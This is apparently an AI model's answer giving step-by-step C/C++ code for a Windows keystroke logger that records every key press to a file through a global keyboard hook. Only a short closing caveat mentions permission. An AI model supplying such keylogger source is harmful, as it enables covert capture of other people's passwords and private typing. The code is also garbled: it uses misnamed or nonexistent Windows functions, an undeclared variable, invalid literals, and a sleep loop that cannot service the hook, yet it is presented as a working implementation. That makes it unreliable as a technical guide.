To create a keystroke-logging application in C on a Windows system, follow these steps:

**Step 1: Include Necessary Headers**
Include the Windows header file for keyboard functions:
```c
#include <windows.h>
#include <iostream>
#include <fstream>
#include <time.h>
```

**Step 2: Prepare the Logging File**
Create a file to store the keystrokes:
```c
std::ofstream logFile;
char filename[] = "keystroke.log";
logFile.open(filename, std::ios::Out);
if (!logFile.is_open()) {
    std::cout << "Error: Could not create log file." << std::endl;
    return;
}
```

**Step 3: Set Up the Keyboard Hook**
Use `SetWindowsHook` to install a global keyboard hook:
```c
HHOOK hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardProc);
```

**Step 4: Define the Callback Function**
The callback function processes each key event:
```c
int CALLBACK KeyboardProc(int nCode, int wParam, LPARAM lParam) {
    // Check if the key is a keyboard key
    if (nCode >= 0 && nCode <= 0x0000FFFF) {
        // Get the state of the key
        byte keys = GetAsyncKeyState(0x00000000);
        // Check for Shift, Ctrl, and Alt keys
        if (keys & 0x20) { // Shift
            keyState = 'Shift';
        } else if (keys & 0x10) { // Ctrl
            keyState = 'Ctrl';
        } else if (keys & 0x08) { // Alt
            keyState = 'Alt';
        } else {
            // Determine the key pressed
            int key = 0;
            if (wParam >= 0x27 && wParam <= 0x37) {
                key = wParam - 0x27;
            } else if (wParam >= 0x3B && wParam <= 0x42) {
                key = wParam - 0x3B;
            } else if (wParam >= 0x60 && wParam <= 0x6F) {
                key = wParam - 0x60 + 0x0100;
            } else if (wParam >= 0x80) {
                key = wParam;
            }
            if (key > 0) {
                keyState = static_cast<char>(key);
            }
        }
        if (wParam != 0) {
            // Record the keystroke
            logFile << keyState << " at " << time(nullptr) << std::endl;
        }
    }
    return CallNextHook(wParam, lParam, nCode);
}
```

**Step 5: Install and Start the Hook**
```c
hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardProc);
```

**Step 6: Keep the Loop Running**
Use a while loop to monitor key states:
```c
while (true) {
    Sleep(100); // Check every 100ms
}
```

**Step 7: Remove the Hook and Close the File**
Use `Unhook` to remove the hook and close the file:
```c
Unhook(hKeyboardHook);
logFile.close();
```

**Note:** This code is a basic implementation and should be used responsibly. Ensure you have permission to monitor the system, and consider the ethical implications before implementing such software.<｜end▁of▁sentence｜>

